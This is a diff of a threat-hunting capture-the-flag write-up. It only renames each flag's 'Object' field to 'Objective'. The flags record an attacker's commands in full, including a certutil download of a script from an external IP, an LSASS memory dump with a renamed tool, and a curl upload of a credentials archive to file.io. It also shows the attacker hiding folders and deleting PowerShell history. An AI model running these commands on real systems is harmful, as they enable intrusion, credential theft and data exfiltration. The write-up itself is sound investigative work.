@@ -126,7 +126,7 @@ The Account name is also visible in the evidence from Flag 1.
 
 ## 🚩Flag 4: DISCOVERY - Share Enumeration Command
 
-Object: "net.exe" share
+Objective: "net.exe" share
 
 Query used:
 ```
@@ -160,43 +160,43 @@ These are all the actions we can see from the above evidence. The rest is covere
 
 ## 🚩 Flag 5: DISCOVERY - Remote Share Enumeration
 
-Object: "net.exe" view \\10.1.0.188
+Objective: "net.exe" view \\10.1.0.188
 
 ---
 
 ## 🚩 Flag 6: DISCOVERY - Privilege Enumeration
 
-Object: "whoami.exe" /all
+Objective: "whoami.exe" /all
 
 ---
 
 ## 🚩 Flag 7: DISCOVERY - Network Configuration Command
 
-Object: "ipconfig.exe" /all
+Objective: "ipconfig.exe" /all
 
 ---
 
 ## 🚩 Flag 8: DEFENSE EVASION - Directory Hiding Command
 
-Object: "attrib.exe" +h +s C:\Windows\Logs\CBS
+Objective: "attrib.exe" +h +s C:\Windows\Logs\CBS
 
 ---
 
 ## 🚩 Flag 9: COLLECTION - Staging Directory Path
 
-Object: C:\Windows\Logs\CBS
+Objective: C:\Windows\Logs\CBS
 
 ---
 
 ## 🚩 Flag 10 DEFENSE EVASION - Script Download Command
 
-Object: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
+Objective: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
 
 ---
 
 ## 🚩 Flag 11: COLLECTION - Credential File Discovery
 
-Object: IT-Admin-Passwords.csv
+Objective: IT-Admin-Passwords.csv
 
 Query used:
 ```
@@ -216,19 +216,19 @@ I looked in the staging directory for all created files, and found the correct f
 
 ## 🚩 Flag 12: COLLECTION - Recursive Copy Command
 
-Object: "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
+Objective: "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
 
 ---
 
 ## 🚩 Flag 13: COLLECTION - Compression Command
 
-Object: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
+Objective: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
 
 ---
 
 ## 🚩 Flag 14: CREDENTIAL ACCESS - Renamed Tool
 
-Object: pd.exe
+Objective: pd.exe
 
 Query used:
 ```
@@ -248,7 +248,7 @@ The answer can be seen from Flag15 as well. Still, there is also evidence of Fil
 
 ## 🚩 Flag 15: CREDENTIAL ACCESS - Memory Dump Command
 
-Object: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
+Objective: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
 
 Query used:
 ```
@@ -266,7 +266,7 @@ Flag 15 is also part of the commands executed by the attacker and as can be seen
 
 ## 🚩 Flag 16: EXFILTRATION - Upload Command
 
-Object: "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+Objective: "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
 
 Query used:
 ```
@@ -287,25 +287,25 @@ The evidence provided is the continuation from Flag 4, where we can see more of 
 
 ## 🚩 Flag 17: EXFILTRATION - Cloud Service
 
-Object: file.io
+Objective: file.io
 
 ---
 
 ## 🚩 Flag 18: PERSISTENCE - Registry Value Name
 
-Object: FileShareSync
+Objective: FileShareSync
 
 ---
 
 ## 🚩 Flag 19: PERSISTENCE - Beacon Filename
 
-Object: svchost.ps1
+Objective: svchost.ps1
 
 ---
 
 ## 🚩 Flag 20: ANTI-FORENSICS - History File Deletion
 
-Object: ConsoleHost_history.txt
+Objective: ConsoleHost_history.txt
 
 Query used:
 ```
